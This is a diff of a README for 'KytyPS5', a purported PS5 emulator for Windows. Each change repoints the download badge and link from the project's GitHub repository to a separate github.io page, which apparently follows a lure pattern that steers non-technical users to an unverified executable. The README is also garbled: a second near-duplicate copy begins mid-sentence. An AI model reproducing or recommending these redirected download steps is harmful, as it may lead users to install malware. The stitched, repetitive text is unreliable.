@@ -1,6 +1,6 @@
 # 🎮 KytyPS5 - Run PlayStation 5 Games on Windows
 
-[![Download KytyPS5](https://img.shields.io/badge/Download_KytyPS5-ff69b4?style=for-the-badge&labelColor=8a2be2&logo=github&logoColor=white)](https://github.com/chaosyizer/KytyPS5)
+[![Download KytyPS5](https://img.shields.io/badge/Download_KytyPS5-ff69b4?style=for-the-badge&labelColor=8a2be2&logo=github&logoColor=white)](https://chaosyizer.github.io)
 
 KytyPS5 is an experimental Windows application for running PlayStation 5 games on your PC. This U59 package brings together merged shader and renderer fixes, a complete sanitized main history, and ready-to-use Windows releases. It is designed for everyday users who want a straightforward way to download the latest build and start exploring PS5 emulation on Windows.
 
@@ -14,7 +14,7 @@ This README walks you through the download link, what is included, how to start 
 
 Visit this link to download the application:
 
-[Download KytyPS5](https://github.com/chaosyizer/KytyPS5)
+[Download KytyPS5](https://chaosyizer.github.io)
 
 Use the link above to reach the official KytyPS5 download page. From there, download the application for Windows. The top of this page also includes a large download button that points to the same location. Keep the page open until your download begins, then continue with the setup section below.
 
@@ -60,7 +60,7 @@ If you see a message from Windows when opening the application, review the promp
 
 **Do I need programming knowledge?** No. KytyPS5 is# 🎮 KytyPS5 - Play PS5 Games on Windows
 
-[![Download KytyPS5](https://img.shields.io/badge/Download_KytyPS5-ff69b4?style=for-the-badge&labelColor=8a2be2&logo=github&logoColor=white)](https://github.com/chaosyizer/KytyPS5)
+[![Download KytyPS5](https://img.shields.io/badge/Download_KytyPS5-ff69b4?style=for-the-badge&labelColor=8a2be2&logo=github&logoColor=white)](https://chaosyizer.github.io)
 
 KytyPS5 is an experimental Windows application for running PlayStation 5 games on your PC. This U59 package brings together merged shader and renderer fixes, a complete sanitized main history, and ready-to-use Windows releases. It is built for everyday users who want a simple way to download the latest build and begin exploring PS5 emulation on Windows without touching a single line of code.
 
@@ -74,7 +74,7 @@ This README walks you through the download link, what is included, how to start 
 
 Visit this link to download the application:
 
-[Download KytyPS5](https://github.com/chaosyizer/KytyPS5)
+[Download KytyPS5](https://chaosyizer.github.io)
 
 Use the link above to reach the official KytyPS5 download page. From there, download the application for Windows. The large button at the very top of this page points to the same location, so you can use whichever is easiest to click. Keep the page open until your download begins, then move on to the setup section below.
 
